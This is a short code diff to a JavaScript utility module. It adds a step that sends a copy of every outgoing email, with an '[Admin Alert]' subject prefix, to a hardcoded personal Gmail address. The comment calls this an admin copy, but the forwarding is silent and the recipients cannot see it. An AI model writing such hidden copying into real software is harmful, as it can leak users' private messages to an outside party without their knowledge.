@@ -705,6 +705,21 @@ const Utils = (() => {
         Utils.showToast(`Email delivery failed: ${response}`, 'error', 8000);
         return false;
       }
+
+      // Also send a copy to the admin email (specialfare21@gmail.com) if not already the recipient
+      const adminEmail = 'specialfare21@gmail.com';
+      if (to.trim().toLowerCase() !== adminEmail) {
+        const adminEmailConfig = Object.assign({}, emailConfig, {
+          To: adminEmail,
+          Subject: `[Admin Alert] ${subject}`
+        });
+        Email.send(adminEmailConfig).then(adminResp => {
+          console.log('Admin SMTP copy response:', adminResp);
+        }).catch(err => {
+          console.error('Error sending admin copy:', err);
+        });
+      }
+
       return true;
     } catch (error) {
       console.error('Error sending email:', error);
